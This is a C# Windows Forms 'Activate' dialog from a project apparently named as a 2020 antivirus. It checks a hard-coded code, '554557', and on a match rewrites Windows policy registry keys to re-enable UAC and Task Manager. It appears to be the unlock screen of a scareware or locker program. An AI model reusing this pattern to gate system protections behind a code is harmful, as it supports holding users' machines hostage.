﻿using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace _10_Antivirus_2020
{
    public partial class Activate : Form
    {
        public Activate()
        {
            InitializeComponent();
        }

        private void Activate_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == "")
            {
                MessageBox.Show("The activation code is incorrect", "Activation", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else if (textBox1.Text == "554557")
            {
                MessageBox.Show("The activation key is correct", "Activation", MessageBoxButtons.OK, MessageBoxIcon.Information);

                RegistryKey reg = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                reg.SetValue("FilterAdministratorToken", 0, RegistryValueKind.DWord);
                RegistryKey reg2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                reg2.SetValue("EnableLUA", 1, RegistryValueKind.DWord);
                RegistryKey reg3 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                reg3.SetValue("DisableTaskMgr", 0, RegistryValueKind.String);

                this.Close();
            }
        }
    }
}
